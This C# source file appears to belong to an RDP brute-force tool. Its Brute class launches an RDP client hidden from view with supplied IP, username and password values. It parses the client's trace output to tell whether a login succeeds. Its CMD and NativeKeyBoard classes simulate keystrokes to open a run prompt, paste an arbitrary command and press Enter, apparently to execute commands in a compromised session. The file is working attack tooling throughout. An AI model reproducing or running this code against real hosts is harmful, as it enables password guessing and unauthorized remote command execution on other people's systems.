using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace RdpRun
{
    public class Core
    {

    }
    public class Brute
    {
        private int flag_password_ok = -1;
        private bool check_login;
        private Process process;
        public void KillRDPprocess()
        {
            if (!process.HasExited)
            {
                process.Kill();
            };
            process.Close();
        }
        public int Check(string exePath, string ip, string user, string pass, bool checklogin)
        {
            string cmd;

            check_login = checklogin;
            process = new Process();
            process.StartInfo.FileName = exePath;
            if (check_login)
            {
                cmd = $"/u:{user} /p:{pass} /cert-ignore /sec:nla /log-level:trace /size:700x700 /v:{ip}";

            }
            else
            {
                cmd = $"/u:{user} /p:{pass} /cert-ignore +auth-only /sec:nla /log-level:trace /size:700x700 /v:{ip}";

            }
            process.StartInfo.Arguments = cmd;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.RedirectStandardOutput = true;
            process.OutputDataReceived += new DataReceivedEventHandler(ProcessOutputDataReceived);

            try
            {
                process.Start();
                process.BeginOutputReadLine();

                while (true)
                {
                    if (process.HasExited)
                    {
                        return 0;
                    }
                    Thread.Sleep(1000);
                    if (flag_password_ok >= 0)//已经获取到登录结果数据
                    {
                        if (!check_login)
                        {
                            KillRDPprocess();
                        }
                        return flag_password_ok;
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                return 0;
            }
        }

        private void ProcessOutputDataReceived(object sender, DataReceivedEventArgs e)
        {
            try
            {
                if (check_login)
                {
                    if (e.Data.Contains("LogonInfoV2"))
                    {
                        flag_password_ok = 1;
                    }
                }
                else
                {
                    if (e.Data.Contains("Server rdp encryption method"))
                    {
                        flag_password_ok = 1;
                    }
                    else if (e.Data.Contains("check_fds: transport_read_pdu() - -1"))
                    {
                        flag_password_ok = 0;
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }
    }
    /*
     https://github.com/EasyAsABC123/Keyboard

         */
    public class CMD
    {
        struct INPUT
        {
            public INPUTType type;
            public INPUTUnion Event;
        }
        [StructLayout(LayoutKind.Explicit)]
        struct INPUTUnion
        {
            [FieldOffset(0)]
            internal MOUSEINPUT mi;
            [FieldOffset(0)]
            internal KEYBDINPUT ki;
            [FieldOffset(0)]
            internal HARDWAREINPUT hi;
        }
        [StructLayout(LayoutKind.Sequential)]
        struct MOUSEINPUT
        {
            public int dx;
            public int dy;
            public int mouseData;
            public int dwFlags;
            public uint time;
            public IntPtr dwExtraInfo;
        }
        [StructLayout(LayoutKind.Sequential)]
        struct KEYBDINPUT
        {
            public ushort wVk;
            public ushort wScan;
            public KEYEVENTF dwFlags;
            public int time;
            public IntPtr dwExtraInfo;
        }
        [StructLayout(LayoutKind.Sequential)]
        struct HARDWAREINPUT
        {
            public int uMsg;
            public short wParamL;
            public short wParamH;
        }
        enum INPUTType : uint { INPUT_KEYBOARD = 1 }
        [Flags]
        enum KEYEVENTF : uint { EXTENDEDKEY = 0x0001, KEYUP = 0x0002, SCANCODE = 0x0008, UNICODE = 0x0004 }
        
        [DllImport("user32.dll", SetLastError = true)]
        static extern uint SendInput(int numberOfInputs, INPUT[] inputs, int sizeOfInputStructure);
        
        
        [DllImport("user32.dll")]
        internal static extern uint MapVirtualKey(uint uCode, uint uMapType);
       
        public static void RunCmd(string cmdstr)
        {
            WinR();
            SetClipBoard(cmdstr);
            Paste();
            Enter();
            //SetClipBoard(" ");
        }
        private static void SetClipBoard(string keys)
        {
            
            Thread staThread = new Thread(
                delegate ()
                {
                    try
                    {
                        Clipboard.SetText(keys);
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex);
                    }
                });
            //在可以调用 OLE 之前，必须将当前线程设置为单线程单元(STA)模式。
            staThread.SetApartmentState(ApartmentState.STA);
            staThread.Start();
            staThread.Join();
        }
        private static void WinR()
        {
            INPUT[] input = new INPUT[4];
            input[0].type = input[1].type = input[2].type = input[3].type = INPUTType.INPUT_KEYBOARD;
            input[0].Event.ki.wScan = input[2].Event.ki.wScan = (ushort)MapVirtualKey((uint)Keys.ControlKey, (uint)0x0);
            input[1].Event.ki.wScan = input[3].Event.ki.wScan = (ushort)MapVirtualKey((uint)Keys.Escape, (uint)0x0);
            input[2].Event.ki.dwFlags = input[3].Event.ki.dwFlags = KEYEVENTF.KEYUP;
            SendInput(4, input, Marshal.SizeOf(typeof(INPUT)));
        }
        private static void Paste()
        {
            Thread.Sleep(200);
            INPUT[] input = new INPUT[4];
            input[0].type = input[1].type = input[2].type = input[3].type = INPUTType.INPUT_KEYBOARD;
            input[0].Event.ki.wScan = input[2].Event.ki.wScan = (ushort)MapVirtualKey((uint)Keys.ControlKey, (uint)0x0);
            input[1].Event.ki.wScan = input[3].Event.ki.wScan = (ushort)MapVirtualKey((uint)Keys.V, (uint)0x0);
            input[2].Event.ki.dwFlags = input[3].Event.ki.dwFlags = KEYEVENTF.KEYUP;
            SendInput(4, input, Marshal.SizeOf(typeof(INPUT)));
        }
        private static void Enter()
        {
            Thread.Sleep(200);
            INPUT[] input = new INPUT[4];
            input[0].type = input[1].type = input[2].type = input[3].type = INPUTType.INPUT_KEYBOARD;
            input[0].Event.ki.wScan = input[2].Event.ki.wScan = (ushort)MapVirtualKey((uint)Keys.ControlKey, (uint)0x0);
            input[1].Event.ki.wScan = input[3].Event.ki.wScan = (ushort)MapVirtualKey((uint)Keys.Return, (uint)0x0);
            input[2].Event.ki.dwFlags = input[3].Event.ki.dwFlags = KEYEVENTF.KEYUP;
            SendInput(4, input, Marshal.SizeOf(typeof(INPUT)));
        }
    }

    public class NativeKeyBoard
    {
        #region bVk参数 常量定义

        public const byte vbKeyLButton = 0x1;    // 鼠标左键
        public const byte vbKeyRButton = 0x2;    // 鼠标右键
        public const byte vbKeyCancel = 0x3;     // CANCEL 键
        public const byte vbKeyMButton = 0x4;    // 鼠标中键
        public const byte vbKeyBack = 0x8;       // BACKSPACE 键
        public const byte vbKeyTab = 0x9;        // TAB 键
        public const byte vbKeyClear = 0xC;      // CLEAR 键
        public const byte vbKeyReturn = 0xD;     // ENTER 键
        public const byte vbKeyShift = 0x10;     // SHIFT 键
        public const byte vbKeyControl = 0x11;   // CTRL 键
        public const byte vbKeyAlt = 18;         // Alt 键  (键码18)
        public const byte vbKeyMenu = 0x12;      // MENU 键
        public const byte vbKeyPause = 0x13;     // PAUSE 键
        public const byte vbKeyCapital = 0x14;   // CAPS LOCK 键
        public const byte vbKeyEscape = 0x1B;    // ESC 键
        public const byte vbKeySpace = 0x20;     // SPACEBAR 键
        public const byte vbKeyPageUp = 0x21;    // PAGE UP 键
        public const byte vbKeyEnd = 0x23;       // End 键
        public const byte vbKeyHome = 0x24;      // HOME 键
        public const byte vbKeyLeft = 0x25;      // LEFT ARROW 键
        public const byte vbKeyUp = 0x26;        // UP ARROW 键
        public const byte vbKeyRight = 0x27;     // RIGHT ARROW 键
        public const byte vbKeyDown = 0x28;      // DOWN ARROW 键
        public const byte vbKeySelect = 0x29;    // Select 键
        public const byte vbKeyPrint = 0x2A;     // PRINT SCREEN 键
        public const byte vbKeyExecute = 0x2B;   // EXECUTE 键
        public const byte vbKeySnapshot = 0x2C;  // SNAPSHOT 键
        public const byte vbKeyDelete = 0x2E;    // Delete 键
        public const byte vbKeyHelp = 0x2F;      // HELP 键
        public const byte vbKeyNumlock = 0x90;   // NUM LOCK 键

        //常用键 字母键A到Z
        public const byte vbKeyA = 65;
        public const byte vbKeyB = 66;
        public const byte vbKeyC = 67;
        public const byte vbKeyD = 68;
        public const byte vbKeyE = 69;
        public const byte vbKeyF = 70;
        public const byte vbKeyG = 71;
        public const byte vbKeyH = 72;
        public const byte vbKeyI = 73;
        public const byte vbKeyJ = 74;
        public const byte vbKeyK = 75;
        public const byte vbKeyL = 76;
        public const byte vbKeyM = 77;
        public const byte vbKeyN = 78;
        public const byte vbKeyO = 79;
        public const byte vbKeyP = 80;
        public const byte vbKeyQ = 81;
        public const byte vbKeyR = 82;
        public const byte vbKeyS = 83;
        public const byte vbKeyT = 84;
        public const byte vbKeyU = 85;
        public const byte vbKeyV = 86;
        public const byte vbKeyW = 87;
        public const byte vbKeyX = 88;
        public const byte vbKeyY = 89;
        public const byte vbKeyZ = 90;

        //数字键盘0到9
        public const byte vbKey0 = 48;    // 0 键
        public const byte vbKey1 = 49;    // 1 键
        public const byte vbKey2 = 50;    // 2 键
        public const byte vbKey3 = 51;    // 3 键
        public const byte vbKey4 = 52;    // 4 键
        public const byte vbKey5 = 53;    // 5 键
        public const byte vbKey6 = 54;    // 6 键
        public const byte vbKey7 = 55;    // 7 键
        public const byte vbKey8 = 56;    // 8 键
        public const byte vbKey9 = 57;    // 9 键


        public const byte vbKeyNumpad0 = 0x60;    //0 键
        public const byte vbKeyNumpad1 = 0x61;    //1 键
        public const byte vbKeyNumpad2 = 0x62;    //2 键
        public const byte vbKeyNumpad3 = 0x63;    //3 键
        public const byte vbKeyNumpad4 = 0x64;    //4 键
        public const byte vbKeyNumpad5 = 0x65;    //5 键
        public const byte vbKeyNumpad6 = 0x66;    //6 键
        public const byte vbKeyNumpad7 = 0x67;    //7 键
        public const byte vbKeyNumpad8 = 0x68;    //8 键
        public const byte vbKeyNumpad9 = 0x69;    //9 键
        public const byte vbKeyMultiply = 0x6A;   // MULTIPLICATIONSIGN(*)键
        public const byte vbKeyAdd = 0x6B;        // PLUS SIGN(+) 键
        public const byte vbKeySeparator = 0x6C;  // ENTER 键
        public const byte vbKeySubtract = 0x6D;   // MINUS SIGN(-) 键
        public const byte vbKeyDecimal = 0x6E;    // DECIMAL POINT(.) 键
        public const byte vbKeyDivide = 0x6F;     // DIVISION SIGN(/) 键
        public const byte vbKeyLwin = 0x5B;
        public const byte vbKeyRwin = 0x5C;

        //F1到F12按键
        public const byte vbKeyF1 = 0x70;   //F1 键
        public const byte vbKeyF2 = 0x71;   //F2 键
        public const byte vbKeyF3 = 0x72;   //F3 键
        public const byte vbKeyF4 = 0x73;   //F4 键
        public const byte vbKeyF5 = 0x74;   //F5 键
        public const byte vbKeyF6 = 0x75;   //F6 键
        public const byte vbKeyF7 = 0x76;   //F7 键
        public const byte vbKeyF8 = 0x77;   //F8 键
        public const byte vbKeyF9 = 0x78;   //F9 键
        public const byte vbKeyF10 = 0x79;  //F10 键
        public const byte vbKeyF11 = 0x7A;  //F11 键
        public const byte vbKeyF12 = 0x7B;  //F12 键

        private const int KEYEVENTF_EXTENDEDKEY = 1;
        private const int KEYEVENTF_KEYUP = 2;
        #endregion

        #region 引用win32api方法

        /// <summary>
        /// 导入模拟键盘的方法
        /// </summary>
        /// <param name="bVk" >按键的虚拟键值</param>
        /// <param name= "bScan" >扫描码，一般不用设置，用0代替就行</param>
        /// <param name= "dwFlags" >选项标志：0：表示按下，2：表示松开</param>
        /// <param name= "dwExtraInfo">一般设置为0</param>
        [DllImport("user32.dll")]
        public static extern void keybd_event(byte bVk, byte bScan, int dwFlags, int dwExtraInfo);

        #endregion

        public static void CtrlV()
        {
            //模拟按下ctrl键
            keybd_event(vbKeyControl, 0, 0, 0);
            //模拟按下V键
            keybd_event(vbKeyV, 0, 0, 0);

            //模拟松开ctrl键
            keybd_event(vbKeyControl, 0, 2, 0);
            //模拟松开V键
            keybd_event(vbKeyV, 0, 2, 0);
        }

        public static void WinR()
        {
            keybd_event(vbKeyLwin,0, KEYEVENTF_EXTENDEDKEY,0);
                //模拟按下R键
            keybd_event(vbKeyR, 0, 0, 0);

            
            //模拟松开R键
            keybd_event(vbKeyR, 0, 2, 0);
            keybd_event(vbKeyLwin, 0, KEYEVENTF_EXTENDEDKEY|KEYEVENTF_KEYUP, 0);

        }

        public static void Enter()
        {
            //模拟按下
            keybd_event(vbKeyReturn, 0, KEYEVENTF_EXTENDEDKEY, 0);
            //模拟松开
            keybd_event(vbKeyReturn, 0, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0);
        }


    }
}
